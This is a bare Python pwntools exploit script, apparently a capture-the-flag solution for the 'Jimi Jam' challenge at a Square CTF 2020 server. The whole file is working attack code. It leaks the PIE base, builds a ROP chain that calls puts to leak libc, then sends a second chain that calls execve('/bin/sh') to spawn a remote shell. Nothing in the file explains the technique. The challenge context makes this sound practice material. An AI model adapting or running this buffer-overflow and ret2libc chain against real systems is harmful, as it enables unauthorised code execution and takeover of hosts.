#exploit for Jimi Jam
#flag{do_you_like_ropping}
from pwn import *
import time
elf = ELF("./jimi-jam")
libc=elf.libc
context.binary=elf
#target=process([elf.path])
target=remote('challenges.2020.squarectf.com',9000)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

target.recvuntil("right here! ")
pie_base=int(target.recv(14)[2:],16)-0x4060
poprdi=0x00000000000013a3+pie_base
putsgot=pie_base+elf.got["puts"]
putsplt=pie_base+0x10b0
restart=pie_base+elf.sym["_start"]
payload="A"*0x10
payload+=p64(poprdi)+p64(putsgot)+p64(putsplt)+p64(restart)
sa("JAM JAIL\n",payload)
libc_base=u64(target.recvline().strip("\n").ljust(8,"\x00"))-libc.sym["puts"]
print(hex(libc_base))
libc_execve=libc_base+libc.sym["execve"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
poprsi=libc_base+0x0000000000027529
xorrdx=libc_base+0x0000000000142071
payload="A"*0x10+p64(poprdi)+p64(libc_binsh)+p64(poprsi)+p64(0)+p64(xorrdx)+p64(libc_execve)
sa("JAM JAIL\n",payload)
target.interactive()
